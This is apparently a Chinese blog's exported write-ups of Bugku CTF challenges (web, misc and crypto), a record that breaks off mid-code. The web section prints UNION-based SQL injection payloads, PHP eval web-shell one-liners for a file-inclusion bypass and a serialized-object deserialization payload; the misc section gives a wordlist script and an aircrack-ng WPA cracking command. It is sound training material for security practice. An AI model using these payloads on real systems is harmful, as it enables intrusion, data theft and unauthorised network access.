title="秋名山老司机"></a>秋名山老司机</h2><p>脚本题。。。。这是某位大佬的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(&quot;http://120.24.86.145:8002/qiumingshan/&quot;)</span><br><span class="line">searchObj = re.search(r&apos;^&lt;div&gt;(.*)=\?;&lt;/div&gt;$&apos;, r.text, re.M | re.S)</span><br><span class="line">d = &#123;</span><br><span class="line">    &quot;value&quot;: eval(searchObj.group(1))</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(&quot;http://120.24.86.145:8002/qiumingshan/&quot;, data=d)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>找来找去页面就发现这种东西<br><img src="https://s1.ax1x.com/2018/05/20/CgfK9P.png" alt="CgfK9P.png"><br>然后扫描以下网站<br>发现以下几个网站<br><img src="https://s1.ax1x.com/2018/05/20/CgfM1f.png" alt="CgfM1f.png"><br>其中最有利用价值的是phpmyadmin，用刚才的那个wp那个东西登录即可。。<br><img src="https://s1.ax1x.com/2018/05/20/CgfQc8.png" alt="CgfQc8.png"></p><h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>这题真是太坑。。。。哪有什么注入。。。<br>我是看到别人wp说直接扫目录即可。。。<br>找到一个叫flag的东西下载下来，真的气死</p><h2 id="这是一个神奇的登录界面"><a href="#这是一个神奇的登录界面" class="headerlink" title="这是一个神奇的登录界面"></a>这是一个神奇的登录界面</h2><p>简单的post注入，什么过滤都没有。。。<br>先尝试” 报错，然后构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select order by 2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select 1,2##&amp;admin_passwd=&amp;submit=GO GO GO     确定回显</span><br><span class="line">admin_name=-1&quot; union select database(),2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=daTABASE()##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/20/CgWq6U.png" alt="CgWq6U.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;flag1&apos;##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/05/20/CgWLXF.png" alt="CgWLXF.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select flag1,2 from `flag1`##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgcAgg.png" alt="CgcAgg.png"></p><h2 id="文件包含二"><a href="#文件包含二" class="headerlink" title="文件包含二"></a>文件包含二</h2><p>两种绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就是upload.php中是不能以php运行的</p><h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>参考下面这一篇文章<br><a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a><br>既可以很快构造payload了<br>随便一个用户名加上一个超过它数据库规定的长度即可</p><h2 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a>welcome to bugku</h2><p>抓包发现源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>出现file_get_contents，绕过第一层，然后用伪协议读取文件<br><img src="https://s1.ax1x.com/2018/05/20/CgcFC8.png" alt="CgcFC8.png"><br>得到base64编码然后解码得到下面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     &lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>感觉还是少了点东西，再用同样的方法查看index.php<br>这一下就感觉比较全了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到unserialize就知道想要考察反序列化漏洞<br>从hint.php知道这个类，我们就可以构造一个类然后在echo函数调用后去调用__tostring()函数,然后读取文件<br>这里是我构造的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">          &#125;  </span><br><span class="line"></span><br><span class="line">$a= new Flag();</span><br><span class="line">$a-&gt;file = &apos;flag.php&apos;;</span><br><span class="line">print _r(serialize($a));</span><br></pre></td></tr></table></figure><p>最后另<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>，发包得到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg6ttf.png" alt="Cg6ttf.png"></p><p>有时候不一定构造类，普通的数组也行，最近在实验吧做题遇到了一题直接用数组反序列化的题目。。。还是要看清楚题目要没有给你类之类的</p><h2 id="还没做完有待更新"><a href="#还没做完有待更新" class="headerlink" title="还没做完有待更新"></a>还没做完有待更新</h2>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Misc write up</title>
      <link href="/2018/02/14/bugku-Misc/"/>
      <url>/2018/02/14/bugku-Misc/</url>
      <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>直接关注公众号即可，不多说</p><a id="more"></a><h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><p>打开拉到最后发现Html编码，上python脚本。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgW1oR.png" alt="CgW1oR.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str2 = &apos;你看到的编码&apos;</span><br><span class="line"></span><br><span class="line">from HTMLParser import HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s2 = h.unescape(str2)</span><br><span class="line">s1 = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print s1 </span><br><span class="line">print s2</span><br></pre></td></tr></table></figure></p><p>得到下图，<br><img src="https://s1.ax1x.com/2018/05/20/CgWGJx.png" alt="CgWGJx.png"><br>便猜测是key{you are right}</p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>打开发现是一张png格式的照片，放进StegSolve没发现啥<br>百度一下原来是改高度<br><img src="https://s1.ax1x.com/2018/05/20/CgWtSK.png" alt="CgWtSK.png"><br>找到IDR片段就是00 00 00 0D开头的，把其中的A4改为F4，得到flag<br><img src="https://s1.ax1x.com/2018/05/20/CgWBTA.png" alt="CgWBTA.png"></p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>打开发现是一个数据包，用wireshark打开，查看整个包的信息，可以追踪一下TCP流，发现里面有一个flag<br><img src="https://s1.ax1x.com/2018/05/20/CgWTf0.png" alt="CgWTf0.png"></p><h2 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h2><p>解压发现是个Word文档，尝试打开打不开，放进winhex里面看是504B0304开头的，一个zip文件，改后缀名再次打开，并在里面的document.xml发现flag<br><img src="https://s1.ax1x.com/2018/05/20/CgWHpV.png" alt="CgWHpV.png"></p><h2 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h2><p>放进binwalk里跑一下，发现里面还有一张图片分离出来既是flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfeAA.png" alt="CgfeAA.png"></p><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>直接百度搜图，某刘姓女明星</p><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>看到是一个二进制文件，用RoutePassView打开，题目提示是用户名，便寻找用户名<br><img src="https://s1.ax1x.com/2018/05/20/CgfmtI.png" alt="CgfmtI.png"></p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>jpg图片上来先一波操作，没看到啥有用的，binwalk一下，发现里面有zip，分离出来，打开一看还是个密码题。。。。3个数的密码<br>看不懂他的提示，然后自己用工具爆破一波，密码是871.。。。。这尼玛跟斗地主有什么关系<br><img src="https://s1.ax1x.com/2018/05/20/Cgfg41.png" alt="Cgfg41.png"><br>解开之后发现里面有一张图片winhex打开最后那里有flag。。。还得Base64一波最后得到flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfW36.png" alt="CgfW36.png"></p><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>下载下来发现是一个exe文件，又打不开，放进Notepad++看一下，发现这是一个可以转图片的Base64<br>直接转换即可  <a href="http://base64.xpcha.com/" target="_blank" rel="noopener">http://base64.xpcha.com/</a> 是个二维码<br>扫一下获得key<br><img src="https://s1.ax1x.com/2018/05/20/CgfhjO.png" alt="CgfhjO.png"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>下载下来是一个linux下的压缩包，那就去linux下用tar命令解压缩就行，里面的文件Notepad++打开并搜索关键字key得到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cgf5uD.png" alt="Cgf5uD.png"></p><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>感觉下面还有东西，于是就打算改高度，于是发现了flag</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>直接解压Notepad++打开搜索key就有了，我不知道这个题说Linux想干嘛。。。。。。</p><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>解压后的图片属性里面有Base64编码，先解码，没啥意义，然后binwalk一下，发现里面还有加密rar，便猜测刚猜的Base64是密码，解压成功，<br><img src="https://s1.ax1x.com/2018/05/20/CgfoHH.png" alt="CgfoHH.png"><br>又是那个之前改高度的图片，<br>获得flag<br><img src="https://s1.ax1x.com/2018/05/20/CgfHUA.png" alt="CgfHUA.png"></p><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>用Audacity打开一看是摩斯密码，直接解密即可，然后直接提交<br><img src="https://s1.ax1x.com/2018/05/20/Cgfb4I.png" alt="Cgfb4I.png"></p><h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><p>第一次碰到这个类型的题目<br>利用了python的PIL库。。。。<br>然后参考了下面的博客<br><a href="https://www.cnblogs.com/webFuckeeeer/p/4536776.html" target="_blank" rel="noopener">https://www.cnblogs.com/webFuckeeeer/p/4536776.html</a><br>结果发现题目好像有点问题。。。。人家都是61366行，我这里只有emmmm。。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CgfO8P.png" alt="CgfO8P.png"><br>而且像素也不完整。。。。。应该是表哥更新之后把题目的文件没有全选完就复制进去了。。<br>我就直接输入别人的flag了</p><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>用HXD打开找一下jpg的文件尾FFD9，发现后面有大量的16进制数据。。<br><img src="https://s1.ax1x.com/2018/05/20/CgfXgf.png" alt="CgfXgf.png"><br>复制进去用Notepad++的converter功能转换为ASCII发现一大串坐标<br><img src="https://s1.ax1x.com/2018/05/20/Cgfjv8.png" alt="Cgfjv8.png"><br>用一个叫gunplot(我用的是Windows下的)的画图软件把这些坐标点画出来，先把他们的格式给弄好<br><img src="https://s1.ax1x.com/2018/05/20/CgfxKS.png" alt="CgfxKS.png"></p><p>然后用plot + 文件名的命令导出文件，再扫一扫即可<br><img src="https://s1.ax1x.com/2018/05/20/CgfzDg.png" alt="CgfzDg.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cgh9Ej.png" alt="Cgh9Ej.png"></p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p>常规步骤先binwalk一波，发现里面有一个加密的rar包，找了很久都没找到密码。。。。。<br>发现图片上的字。。。。。。。。可能是密码。。。。尝试一下<br>喜欢我吗.竟然是密码。。。。我去<br>里面有一个txt文件<br><img src="https://s1.ax1x.com/2018/05/20/CghCUs.png" alt="CghCUs.png"><br>先解码第一个摩斯密码<br>发现是一个解密网址。。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CghP5n.png" alt="CghP5n.png"><br>再解密以下网址后面的base64<br><img src="https://s1.ax1x.com/2018/05/20/CghA2V.png" alt="CghA2V.png"><br><img src="https://s1.ax1x.com/2018/05/20/CghEvT.png" alt="CghEvT.png"><br>解密出来发现是一张二维码，扫一下得到flag<br><img src="https://s1.ax1x.com/2018/05/20/CghZKU.png" alt="CghZKU.png"></p><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>这一题可以直接用binwalk把里面的gzip分离出来，那个就是flag<br><img src="https://s1.ax1x.com/2018/02/27/9BsEm6.png" alt="9BsEm6.png"><br><img src="https://s1.ax1x.com/2018/02/27/9BsmkD.png" alt="9BsmkD.png"></p><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描，之后可以大致找到攻击机远程连接目标机的包（通过3389端口），以及smb协议的包（用于Web连接和客户端与服务器之间的信息沟通），再往下可以找到以5542开始的包已经getshell<br>追踪TCP流，发现<br><img src="https://s1.ax1x.com/2018/02/27/9BsMpd.png" alt="9BsMpd.png"><br>然后base64即可</p><h2 id="这么多数据包-1"><a href="#这么多数据包-1" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>追踪TCP流，发现</p><p>然后base64即可</p><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>先写个脚本把密码跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import string</span><br><span class="line">attendNum = string.digits</span><br><span class="line">str1 = &apos;1391040&apos;</span><br><span class="line">f = open(&apos;telephone.txt&apos;,&apos;w&apos;)</span><br><span class="line">for i in attendNum:</span><br><span class="line">for j in attendNum:</span><br><span class="line">for k in attendNum:</span><br><span class="line">for l in attendNum:</span><br><span class="line">f.write(str1+i+j+k+l+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后再用aircrack完成即可<br>aircrack-ng.exe wifi.cap -w telephone.txt<br>发现3上面出现握手包，我们就在 index  number of target写3<br>结果出来<br><img src="https://s1.ax1x.com/2018/05/20/CgWQeJ.png" alt="CgWQeJ.png"></p><h2 id="还没做完，有待更新。。。"><a href="#还没做完，有待更新。。。" class="headerlink" title="还没做完，有待更新。。。"></a>还没做完，有待更新。。。</h2>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Crypto write up</title>
      <link href="/2018/02/12/bugku-Crypto/"/>
      <url>/2018/02/12/bugku-Crypto/</url>
      <content type="html"><![CDATA[<h2 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答~滴"></a>滴答~滴</h2><p>遂一看就知道是摩斯密码，直接摩斯解密，获得密码<br><a id="more"></a></p><h2 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h2><p>根据提示应该是栅栏加密而且是2栏，遂尝试栅栏解密，竖着看就是key<br><img src="https://s1.ax1x.com/2018/05/20/Cg2sHA.png" alt="Cg2sHA.png"></p><h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><p>解密网址:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>全都是Ook就尝试Ook解密，得出flag，如图<br><img src="https://s1.ax1x.com/2018/05/20/Cg26AI.png" alt="Cg26AI.png"></p><h2 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h2><p>解密网址:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>brainfuck解码就得到flag</p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>凯撒解密后发现有一段Base64，然后再来一波base64解码得到flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2g4P.png" alt="Cg2g4P.png"><br><img src="https://s1.ax1x.com/2018/05/20/Cg2O3T.png" alt="Cg2O3T.png"></p><h2 id="一段Base64"><a href="#一段Base64" class="headerlink" title="一段Base64"></a>一段Base64</h2><p>把文件下载下来后，第一次base64之后发现是8进制转义序列，直接复制下来利用python中print函数的默认属性打印一波，得到一个16进制转义序列，再用一次print，下面是我解题时的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'C:/Users/Vinson Chan/Desktop/bs.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">str=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##print base64.b64decode(str)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = [<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span 